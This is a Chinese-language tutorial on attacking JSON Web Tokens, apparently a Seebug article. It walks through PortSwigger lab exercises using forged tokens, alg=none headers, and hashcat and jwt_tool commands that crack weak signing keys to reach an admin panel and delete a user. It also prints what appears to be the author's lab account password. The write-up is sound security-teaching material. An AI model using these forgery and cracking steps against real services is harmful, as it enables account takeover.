# JWT 渗透姿势一篇通

#### 简单介绍

JWT(JSON Web Token)是一种用于身份认证和授权的开放标准，它通过在网络应用间传递被加密的JSON数据来安全地传输信息使得身份验证和授权变得更加简单和安全，JWT对于渗透测试人员而言可能是一种非常吸引人的攻击途径，因为它们不仅是让你获得无限访问权限的关键而且还被视为隐藏了通往以下特权的途径，例如:特权升级、信息泄露、SQLi、XSS、SSRF、RCE、LFI等

#### 基础概念

*   JWS：Signed JWT，签名过的JWT
*   JWK：JWT的密钥，也就是我们常说的SECRET
*   JWE：Encrypted JWT部分payload经过加密的JWT
*   JKU：JKU(JSON Web Key Set URL)是JWT Header中的一个字段，字段内容是一个URI，该URI用于指定用于验证令牌秘钥的服务器，该服务器用于回复JWK
*   X5U：X5U是JWT Header中的一个字段，指向一组X509公共证书的URL，与JKU功能类似
*   X.509标准：X.509标准是密码学里公钥证书的格式标准，包括TLS/SSL(WWW万维网安全浏览的基石)在内的众多Internet协议都应用了X.509证书）

#### 基本结构

JWT(JSON Web Token)的结构由三部分组成，分别是Header、Payload和Signature，下面是每一部分的详细介绍和示例：

Header包含了JWT使用的算法和类型等元数据信息，通常使用JSON对象表示并使用Base64编码，Header中包含两个字段：alg和typ

*   alg(algorithm)：指定了使用的加密算法，常见的有HMAC、RSA和ECDSA等算法
*   typ(type)：指定了JWT的类型，通常为JWT

下面是一个示例Header：

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

其中alg指定了使用HMAC-SHA256算法进行签名，typ指定了JWT的类型为JWT

##### Payload

Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64编码，Payload中包含三个类型的字段：注册声明、公共声明和私有声明

*   公共声明(Public Claims)：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等
*   私有声明(Private Claims)：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等
*   注册声明(Registered Claims)：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等

下面是一个示例Payload：

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

其中sub表示主题，name表示名称，iat表示JWT的签发时间

##### Signature

Signature是使用指定算法对Header和Payload进行签名生成的，用于验证JWT的完整性和真实性，Signature的生成方式通常是将Header和Payload连接起来然后使用指定算法对其进行签名，最终将签名结果与Header和Payload一起组成JWT，Signature的生成和验证需要使用相同的密钥，下面是一个示例Signature

```
HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)
```

其中HMACSHA256是使用HMAC SHA256算法进行签名，header和payload是经过Base64编码的Header和Payload，secret是用于签名和验证的密钥，最终将Header、Payload和Signature连接起来用句点(.)分隔就形成了一个完整的JWT，下面是一个示例JWT，其中第一部分是Header，第二部分是Payload，第三部分是Signature，注意JWT 中的每一部分都是经过Base64编码的，但并不是加密的，因此JWT中的信息是可以被解密的

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

#### 在线平台

下面是一个JWT在线构造和解构的平台：

[https://jwt.io/](https://jwt.io/ "https://jwt.io/ ")

![](https://images.seebug.org/content/images/2023/10/23/1698030417000-5ac430ff-ba62-46d9-bda1-3f60f2f417b8.png-w331s)

#### 工作原理

##### JWT工作原理

JWT的工作流程如下：

*   用户在客户端登录并将登录信息发送给服务器
*   服务器使用私钥对用户信息进行加密生成JWT并将其发送给客户端
*   客户端将JWT存储在本地，每次向服务器发送请求时携带JWT进行认证
*   服务器使用公钥对JWT进行解密和验证，根据JWT中的信息进行身份验证和授权
*   服务器处理请求并返回响应，客户端根据响应进行相应的操作

##### JKU工作原理

Step 1：用户携带JWS(带有签名的JWT)访问应用

![](https://images.seebug.org/content/images/2023/10/23/1698030419000-ee95471b-4068-4978-b667-a52b7a49d758.png-w331s)

Step 2：应用程序解码JWS得到JKU字段

![](https://images.seebug.org/content/images/2023/10/23/1698030419000-a4d87641-83ec-4f03-86cd-c492a5f07c1c.png-w331s)

Step 3：应用根据JKU访问返回JWK的服务器

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-19d19989-361f-4cde-a908-18e100882122.png-w331s)

Step 4：应用程序得到JWK

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-84a5576b-96b9-445f-b25c-8f5aef4cead6.png-w331s)

Step 5：使用JWK验证用户JWS

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-4e7c5e64-ff49-4108-985c-a785056a0f4e.jpg-w331s)

Step 6：验证通过则正常响应

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-a94ccc39-1069-416c-a3b8-431691475d7b.png-w331s)

#### 漏洞攻防

##### 签名未校验

###### 验证过程

JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：

*   分离解构：JWT的Header和Payload是通过句点(.)分隔的，因此需要将JWT按照句点分隔符进行分离
    
*   验证签名：通过使用指定算法对Header和Payload进行签名生成签名结果，然后将签名结果与JWT中的签名部分进行比较，如果两者相同则说明JWT的签名是有效的，否则说明JWT的签名是无效的
    
*   验证信息：如果JWT的签名是有效的则需要对Payload中的信息进行验证，例如:可以验证JWT中的过期时间、发行者等信息是否正确，如果验证失败则说明JWT是无效的

下面是一个使用JAVA进行JWT签名验证的示例代码：

```
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import java.util.Date;
public class JWTExample {

    private static final String SECRET_KEY = "my_secret_key";

    public static void main(String[] args) {
               String jwtToken = Jwts.builder()
                .setSubject("1234567890")
                .claim("name", "John Doe")
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + 3600000))                .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
                .compact();
               try {
                       String[] jwtParts = jwtToken.split("\\.");
            String header = jwtParts[0];
            String payload = jwtParts[1];
            String signature = jwtParts[2];

                       String expectedSignature = Jwts.parser()
                    .setSigningKey(SECRET_KEY)
                    .parseClaimsJws(jwtToken)
                    .getSignature();
            if (!signature.equals(expectedSignature)) {
                throw new RuntimeException("Invalid JWT signature");
            }

                       Claims claims = Jwts.parser()
                    .setSigningKey(SECRET_KEY)
                    .parseClaimsJws(jwtToken)
                    .getBody();
            System.out.println("Valid JWT");
        } catch (Exception e) {
            System.out.println("Invalid JWT: " + e.getMessage());
        }
    }
}
```

在上面的示例代码中使用jwt库进行JWT的签名和验证，首先构建了一个JWT，然后将其分离为Header、Payload和Signature三部分，使用parseClaimsJws函数对JWT进行解析和验证，从而获取其中的Payload中的信息并进行验证，最后如果解析和验证成功，则说明JWT是有效的，否则说明JWT是无效的，在实际应用中应该将SECRET_KEY替换为应用程序的密钥

###### 漏洞案例

JWT库会通常提供一种验证令牌的方法和一种解码令牌的方法，比如:Node.js库jsonwebtoken有verify()和decode()，有时开发人员会混淆这两种方法，只将传入的令牌传递给decode()方法，这意味着应用程序根本不验证签名，而我们下面的使用则是一个基于JWT的机制来处理会话，由于实现缺陷服务器不会验证它收到的任何JWT的签名，如果要解答实验问题，您需要修改会话令牌以访问位于/admin的管理面板然后删除用户carlos，您可以使用以下凭据登录自己的帐户:wiener:peter

靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature ")

![](https://images.seebug.org/content/images/2023/10/317898cd-0bb1-4780-9cf3-f11719598be3.png-w331s)

演示步骤：

Step 1：点击上方的"Access the Lab"访问靶场并登录账户

```
账户:hps_fly@163.com
密码:TfXG;83yacz;#"zt8eBQ)57Lb]dr-b&_
```

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-ea2b7c61-8167-4888-8e30-75827b35c10b.png-w331s)

Step 2：进入到Web界面并登录靶场账户

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-1697ccbc-1ed2-44d3-98f9-eb5416f8e8ef.jpg-w331s)

![](https://paper.seebug.org/3057/img/cdc28433-a8f5-40d6-ab31-0270a9032201.png)

登录之后会看到如下一个更新邮箱的界面

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-e42e220b-1c9b-458f-8b86-82144fa2b70a.png-w331s)

Step 3：此时在我们的burpsuite中我们可以看到如下的会话信息

![](https://images.seebug.org/content/images/2023/10/23/1698030420000-7f9dbb54-7dc5-4e77-865a-24de92ac86d7.png-w331s)

此时查询当前用户可以看到会显示当前用户为wiener：

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-756e366f-ee16-423b-a268-eeffbcd32a96.png-w331s)

截取上面中间一部分base64编码的部分更改上面的sub为"administrator"

```
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5MDA4M30
```

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-dc93251e-a956-451f-8ba9-c86fea666210.png-w331s)

构造一个sub为"administrator"的载荷并将其进行base64编码处理：

```
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTAwODN9
```

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-33071582-35a0-404e-8235-30600b389843.png-w331s)

替换之后重新发送请求：

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-381c394e-eb28-4c66-a8b1-78134893fb85.png-w331s)

按照题目要求访问/admin路径，发现两个删除用户的调用接口：

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-43004b3c-f7bf-4740-8853-f95cd6740dd6.png-w331s)

请求敏感链接——删除用户carlos

```
GET /admin/delete?username=carlos HTTP/1.1
```

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-263ab1c6-3447-4807-b40e-c8858ac7d847.png-w331s)

完成靶场的解答：

![](https://images.seebug.org/content/images/2023/10/23/1698030421000-d711a95d-195e-4202-8673-79aa793840fb.png-w331s)

##### 签名用None

###### 场景介绍

在JWT的Header中alg的值用于告诉服务器使用哪种算法对令牌进行签名，从而告诉服务器在验证签名时需要使用哪种算法，目前可以选择HS256，即HMAC和SHA256，JWT同时也支持将算法设定为"None"，如果"alg"字段设为"None"，则标识不签名，这样一来任何token都是有效的，设定该功能的最初目的是为了方便调试，但是若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为"None"来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站

```
{
    "alg": "none",
    "typ": "JWT"
}
```

###### 漏洞案例

实验靶场：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification")

![](https://images.seebug.org/content/images/2023/10/23/1698030422000-637620e7-1460-4f71-b297-da8f96e26c33.png-w331s)

实验流程：

Step 1：点击上方的"Access the lab"访问靶场环境

[https://0a9c00a8030ba77784d7b92d00cc0086.web-security-academy.net/](https://0a9c00a8030ba77784d7b92d00cc0086.web-security-academy.net/ "https://0a9c00a8030ba77784d7b92d00cc0086.web-security-academy.net/")

![](https://images.seebug.org/content/images/2023/10/23/1698030422000-d417da65-d874-49cf-b5b7-085c8d5f98c8.jpg-w331s)

Step 2：使用账户密码进行登录

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/366d97fc-200a-401d-ad9a-3e4a0324c9c1.png-w331s)

Step 3：登录之后可以看到如下界面

![](https://images.seebug.org/content/images/2023/10/23/1698030422000-0cb644ba-25e4-4be8-b241-0281e628fb01.png-w331s)

Step 4：捕获到的数据报信息如下所示

![](https://images.seebug.org/content/images/2023/10/23/1698030422000-9d7769dd-9b4e-4c7f-b4d7-5745e8b8d5ee.png-w331s)

截取JWT的第二部分对其进行base64解码:

```
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5MzQ5M30
```

![](https://images.seebug.org/content/images/2023/10/23/1698030422000-f0174506-d302-4e41-a07e-b5b5ca78a79a.png-w331s)

将上述的sub字段值更改为"administrator"

```
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTM0OTN9
```

![](https://images.seebug.org/content/images/2023/10/23/1698030422000-805c5896-55c1-43f6-8f58-eacb962fc47f.png-w331s)

Step 5：在使用wiener用户的凭据访问/admin是会提示401 Unauthorized

![](https://images.seebug.org/content/images/2023/10/23/1698030423000-04fa050c-dc31-41ed-ab99-391361c87aea.png-w331s)

Step 6：将第一步分的alg参数改为none

```
eyJraWQiOiIyNmNlNGNmMi0wYjFhLTQzZTUtOWYzNy1kOTA2ZjkxZmY2MzkiLCJhbGciOiJSUzI1NiJ9
```

![](https://images.seebug.org/content/images/2023/10/23/1698030423000-730007e1-bc76-40d6-9062-d0a3f95dba62.png-w331s)

更改之后的header部分：

```
eyJraWQiOiIyNmNlNGNmMi0wYjFhLTQzZTUtOWYzNy1kOTA2ZjkxZmY2MzkiLCJhbGciOiJub25lIn0=
```

![](https://images.seebug.org/content/images/2023/10/23/1698030423000-3966b4b2-0a4e-45cc-8d19-33df618bcc78.png-w331s)

替换JWT Token中的第二部分为之前我们构造的信息，同时移除签名部分，再次请求数据获取到敏感数据链接

![](https://images.seebug.org/content/images/2023/10/23/1698030423000-ef289fc2-864d-41b7-8c9b-eb25b60a7a9a.png-w331s)

调用敏感链接移除用户信息，完成解题操作：

![](https://images.seebug.org/content/images/2023/10/23/1698030423000-ab032307-beaa-4186-bf71-2d1aab7d9d4c.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030423000-8c16ff8e-e39e-4e70-8477-3ee724d0376a.png-w331s)

##### 密钥暴力猜解

###### 密钥介绍

在JT中密钥用于生成和验证签名，因此密钥的安全性对JWT的安全性至关重要，一般来说JWT有以下两种类型的密钥：

*   对称密钥：对称密钥是一种使用相同的密钥进行加密和解密的加密算法，在JWT中使用对称密钥来生成和验证签名，因此密钥必须保密，只有发送方和接收方知道，由于对称密钥的安全性取决于密钥的保密性，因此需要采取一些措施来保护它
    
*   非对称密钥：非对称密钥使用公钥和私钥来加密和解密数据，在JWT中使用私钥生成签名，而使用公钥验证签名，由于公钥可以公开，因此非对称密钥通常用于验证方的身份
    

下面是一个使用JWT和对称密钥的JAVA示例代码：

```
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import java.util.Date;
public class JWTExample {
    private static final String SECRET_KEY = "mysecretkey";    public static void main(String[] args) {
        String token = createJWT("123456");        System.out.println(token);
        String result = parseJWT(token);        System.out.println(result);
    }
    public static String createJWT(String id) {
               long nowMillis = System.currentTimeMillis();
        Date now = new Date(nowMillis);
        long expMillis = nowMillis + 3600000;        Date exp = new Date(expMillis);
               String token = Jwts.builder()
            .setId(id)
            .setIssuer("issuer")
            .setSubject("subject")
            .setIssuedAt(now)
            .setExpiration(exp)
            .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
            .compact();
        return token;
    }
    public static String parseJWT(String token) {
               String result = "";
        try {
            result = Jwts.parser()
                .setSigningKey(SECRET_KEY)
                .parseClaimsJws(token)
                .getBody()
                .getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }
}
```

下面是一个使用JWT和非对称密钥的Java示例代码，代码中使用了RSA算法生成非对称密钥对：

```
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Date;
public class JWTExample {
    private static final String ISSUER = "example.com";
    private static final String SUBJECT = "[user@example.com](mailto:user@example.com)";
    public static void main(String[] args) throws Exception {
        KeyPair keyPair = generateKeyPair();
        String token = createJWT(ISSUER, SUBJECT, keyPair.getPrivate());
        System.out.println(token);
        Claims claims = parseJWT(token, keyPair.getPublic());
        System.out.println(claims.getIssuer());
        System.out.println(claims.getSubject());
    }
    public static String createJWT(String issuer, String subject, PrivateKey privateKey) {
        Date now = new Date();
        Date expiration = new Date(now.getTime() + 3600 * 1000);        return Jwts.builder()
            .setIssuer(issuer)
            .setSubject(subject)
            .setIssuedAt(now)
            .setExpiration(expiration)
            .signWith(privateKey, SignatureAlgorithm.RS256)
            .compact();
    }
    public static Claims parseJWT(String token, PublicKey publicKey) {
        return Jwts.parserBuilder()
            .setSigningKey(publicKey)
            .build()
            .parseClaimsJws(token)
            .getBody();
    }
    public static KeyPair generateKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        return generator.generateKeyPair();
    }
}
```

在这个示例中我们使用了Java中的KeyPairGenerator类来生成一个2048位的RSA密钥对，然后使用私钥生成JWT，使用公钥验证JWT，在创建JWT时我们设置了JWT的颁发者、主题、签发时间和过期时间并使用signWith()方法和SignatureAlgorithm.RS256算法使用私钥进行签名，在验证JWT时我们使用公钥来解析JWT并获取声明的内容，在实际的研发编码中我们一方面要妥善保管密钥，另一方面需要使用较为复杂难以被猜解的密钥作为密钥首选，例如：随机字母+数字的32位长度组合

###### 漏洞案例

在实现JWT应用程序时，开发人员有时会犯一些错误，比如：忘记更改默认密码或占位符密码，他们甚至可能复制并粘贴他们在网上找到的代码片段然后忘记更改作为示例提供的硬编码秘密，在这种情况下攻击者使用众所周知的秘密的单词列表来暴力破解服务器的秘密是很容易的，下面是一个公开已知密钥列表：

[https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.lis "https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list")

![](https://images.seebug.org/content/images/2023/10/23/1698030424000-50306769-e441-4c8f-a70a-a34ada8f08a5.png-w331s)

在这里我们也建议使用hashcat来强力破解密钥，您可以手动安装hashcat，也可以在Kali Linux上使用预先安装好的hashcat，您只需要一个来自目标服务器的有效的、签名的JWT和一个众所周知的秘密的单词表然后就可以运行以下命令，将JWT和单词列表作为参数传入:

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

Hashcat会使用单词列表中的每个密钥对来自JWT的报头和有效载荷进行签名，然后将结果签名与来自服务器的原始签名进行比较，如果有任何签名匹配，hashcat将按照以下格式输出识别出的秘密以及其他各种详细信息，由于hashcat在本地机器上运行不依赖于向服务器发送请求，所以这个过程非常快，即使使用一个巨大的单词表一旦您确定了密钥，您就可以使用它为任何JWT报头和有效载荷生成有效的签名

```
<jwt>:<identified-secret>
```

靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key")

![](https://images.seebug.org/content/images/2023/10/23/1698030424000-9da0cb11-b67e-4f5a-b731-137513cb4545.png-w331s)

实验步骤：

Step 1：点击上述"Access the lab"进入到靶场环境

![](https://images.seebug.org/content/images/2023/10/23/1698030424000-905a419d-013e-4410-84d6-7664ba315156.jpg-w331s)

Step 2：使用以下账户进行登录操作

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/db48184d-216d-45f9-b040-0a889272a2dd.png-w331s)

Step 3：捕获到如下有效的JWT凭据信息

```
eyJraWQiOiI4M2RhOGNjMi1hZmZiLTRmZGMtYWMwYS1iMWNmMTBkNjkyZGYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5NjQwMn0.IhZV-7RHTpEcQvkcZOA3knCYmQD0YUg-NFMj9fWSFjw
```

![](https://images.seebug.org/content/images/2023/10/23/1698030424000-a270d959-5c81-4f5c-ad9c-8c4240c8feaf.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030424000-1392aaf5-e63f-436a-9848-b5b40b6c6033.png-w331s)

Step 4：使用字典进行暴力猜解操作

**方式一：HashCat**

项目地址：[https://github.com/hashcat/hashcat](https://github.com/hashcat/hashcat "https://github.com/hashcat/hashcat")

项目使用：

```
#命令格式：
hashcat -a 0 -m 16500 <jwt> <wordlist>
#执行示例：
hashcat -m 16500 jwt.txt -a 0 secrets.txt --force
```

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-41d30385-7dd8-4947-8989-4d5a2207dba9.png-w331s)

**方式二：jwt_tool**

项目地址：[https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool "https://github.com/ticarpi/jwt_tool")

项目介绍：此项目主要用于JWT安全脆弱性评估，目前支持如下几种安全评估测试

*   (CVE-2015-2951) The alg=none signature-bypass vulnerability
    
*   (CVE-2016-10555) The RS/HS256 public key mismatch vulnerability
    
*   (CVE-2018-0114) Key injection vulnerability
*   (CVE-2019-20933/CVE-2020-28637) Blank password vulnerability
*   (CVE-2020-28042) Null signature vulnerability

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-b3acaba2-8ed3-4c24-a839-86a4a2749e18.png-w331s)

Step 1：克隆项目到本地

```
https://github.com/ticarpi/jwt_tool
```

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-b7ded249-6a0a-4df8-84a5-0dd963413751.png-w331s)

Step 2：安装依赖库

```
pip3 install pycryptodomex
```

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-bbca2e7d-3124-4197-853a-3f3a8c486e43.png-w331s)

Step 3：运行jwt_tool并查看用法信息

```
python3 jwt_tool.py -h
```

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-40268951-fc8b-49a3-ab85-4c15336ae24b.jpg-w331s)

```
usage: jwt_tool.py [-h] [-b] [-t TARGETURL] [-rc COOKIES] [-rh HEADERS] [-pd POSTDATA] [-cv CANARYVALUE] [-np] [-nr] [-M MODE] [-X EXPLOIT] [-ju JWKSURL] [-S SIGN] [-pr PRIVKEY] [-T] [-I] [-hc HEADERCLAIM] [-pc PAYLOADCLAIM] [-hv HEADERVALUE]
                   [-pv PAYLOADVALUE] [-C] [-d DICT] [-p PASSWORD] [-kf KEYFILE] [-V] [-pk PUBKEY] [-jw JWKSFILE] [-Q QUERY] [-v]
                   [jwt]
positional arguments:
  jwt                   the JWT to tinker with (no need to specify if in header/cookies)
options:
  -h, --help            show this help message and exit
  -b, --bare            return TOKENS ONLY
  -t TARGETURL, --targeturl TARGETURL
                        URL to send HTTP request to with new JWT
  -rc COOKIES, --cookies COOKIES
                        request cookies to send with the forged HTTP request
  -rh HEADERS, --headers HEADERS
                        request headers to send with the forged HTTP request (can be used multiple times for additional headers)
  -pd POSTDATA, --postdata POSTDATA
                        text string that contains all the data to be sent in a POST request
  -cv CANARYVALUE, --canaryvalue CANARYVALUE
                        text string that appears in response for valid token (e.g. "Welcome, ticarpi")
  -np, --noproxy        disable proxy for current request (change in jwtconf.ini if permanent)
  -nr, --noredir        disable redirects for current request (change in jwtconf.ini if permanent)
  -M MODE, --mode MODE  Scanning mode:
                        pb = playbook audit
                        er = fuzz existing claims to force errors
                        cc = fuzz common claims
                        at - All Tests!
  -X EXPLOIT, --exploit EXPLOIT
                        eXploit known vulnerabilities:
                        a = alg:none
                        n = null signature
                        b = blank password accepted in signature
                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
                        k = key confusion (specify public key with -pk)
                        i = inject inline JWKS
  -ju JWKSURL, --jwksurl JWKSURL
                        URL location where you can host a spoofed JWKS
  -S SIGN, --sign SIGN  sign the resulting token:
                        hs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)
                        rs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)
                        es256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)
                        ps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)
  -pr PRIVKEY, --privkey PRIVKEY
                        Private Key for Asymmetric crypto
  -T, --tamper          tamper with the JWT contents
                        (set signing options with -S or use exploits with -X)
  -I, --injectclaims    inject new claims and update existing claims with new values
                        (set signing options with -S or use exploits with -X)
                        (set target claim with -hc/-pc and injection values/lists with -hv/-pv
  -hc HEADERCLAIM, --headerclaim HEADERCLAIM
                        Header claim to tamper with
  -pc PAYLOADCLAIM, --payloadclaim PAYLOADCLAIM
                        Payload claim to tamper with
  -hv HEADERVALUE, --headervalue HEADERVALUE
                        Value (or file containing values) to inject into tampered header claim
  -pv PAYLOADVALUE, --payloadvalue PAYLOADVALUE
                        Value (or file containing values) to inject into tampered payload claim
  -C, --crack           crack key for an HMAC-SHA token
                        (specify -d/-p/-kf)
  -d DICT, --dict DICT  dictionary file for cracking
  -p PASSWORD, --password PASSWORD
                        password for cracking
  -kf KEYFILE, --keyfile KEYFILE
                        keyfile for cracking (when signed with 'kid' attacks)
  -V, --verify          verify the RSA signature against a Public Key
                        (specify -pk/-jw)
  -pk PUBKEY, --pubkey PUBKEY
                        Public Key for Asymmetric crypto
  -jw JWKSFILE, --jwksfile JWKSFILE
                        JSON Web Key Store for Asymmetric crypto
  -Q QUERY, --query QUERY
                        Query a token ID against the logfile to see the details of that request
                        e.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a
  -v, --verbose         When parsing and printing, produce (slightly more) verbose output.
If you don't have a token, try this one:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po
```

Step 4：暴力猜解密钥

```
python3 jwt_tool.py JWT_HERE -C -d dictionary.txt
python3 jwt_tool.py eyJraWQiOiI4M2RhOGNjMi1hZmZiLTRmZGMtYWMwYS1iMWNmMTBkNjkyZGYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5NjQwMn0.IhZV-7RHTpEcQvkcZOA3knCYmQD0YUg-NFMj9fWSFjw -C -d secrets.txt
```

![](https://images.seebug.org/content/images/2023/10/eb5d66e5-240f-4df0-8fa3-441bf6d0dfc2.jpg-w331s)

附加扩展：

```
python3 jwt_tool.py JWT_HERE -C -d dictionary.txt
python3 jwt_tool.py JWT_HERE -K -pk my_public.pem
python3 jwt_tool.py JWT_HERE -A
python3 jwt_tool.py JWT_HERE -J -jw jwks.json
python3 jwt_tool.py JWT_HERE -I
python3 jwt_tool.py JWT_HERE -S -u http://example.com/jwks.json
```

Step 5：随后在网页端重新设置密钥(secret1)并重新产生的字符串

Header：

```
eyJraWQiOiJjY2Y4Yjk3YS05NGZlLTRjN2QtOWI2MS0yNzZmMDY1NGMyZWIiLCJhbGciOiJIUzI1NiJ9
{"kid":"ccf8b97a-94fe-4c7d-9b61-276f0654c2eb","alg":"HS256"}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-e5cd361e-9335-4c44-b5e5-45f42812db20.png-w331s)

payload(前)：

```
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5OTk1OX0
{"iss":"portswigger","sub":"wiener","exp":1687799959}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030425000-aba0455e-530f-475f-8b75-b723dee4b18a.png-w331s)

payload(新)：

```
{"iss":"portswigger","sub":"administrator","exp":1687799959}
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTk5NTl9
```

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-ed882dab-67df-40d7-bbbe-deb704210de8.png-w331s)

Signer:

```
E891AutpjiwkhVUDV2dZdrfGzsv5TweyIUUhT_a1Ar0
```

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-34cd3801-aa7d-4578-b6f2-e4e56eb35691.png-w331s)

最终高权限的JWT token如下：

```
eyJraWQiOiJjY2Y4Yjk3YS05NGZlLTRjN2QtOWI2MS0yNzZmMDY1NGMyZWIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTk5NTl9.E891AutpjiwkhVUDV2dZdrfGzsv5TweyIUUhT_a1Ar0
```

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-2cd5d264-5d0d-42b4-8a5a-ecaed6592e85.png-w331s)

Step 6：访问/admin路径

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-a7426043-1089-4a69-ad85-4c4a1e3612e8.png-w331s)

Step 7：调用接口删除用户完成解答

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-0d2a2f6b-ea83-4bf7-95a1-b75013d2bbc2.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-984c7a23-f68e-48e7-8d2c-7e4a4a775879.png-w331s)

##### JWT头部注入

###### 场景介绍

如果服务器端使用一个非常脆弱的密钥，我们甚至有可能一个字符一个字符地来暴力破解这个密钥，根据JWS规范只有alg报头参数是强制的，然而在实践中JWT报头通常包含几个其他参数，以下是攻击者特别感兴趣的：

*   jwk(JSON Web Key)：提供一个代表密钥的嵌入式JSON对象
    
*   jku(JSON Web Key Set URL)：提供一个URL，服务器可以从这个URL获取一组包含正确密钥的密钥
    
*   kid(密钥id)：提供一个ID，在有多个密钥可供选择的情况下服务器可以用它来识别正确的密钥，根据键的格式这可能有一个匹配的kid参数

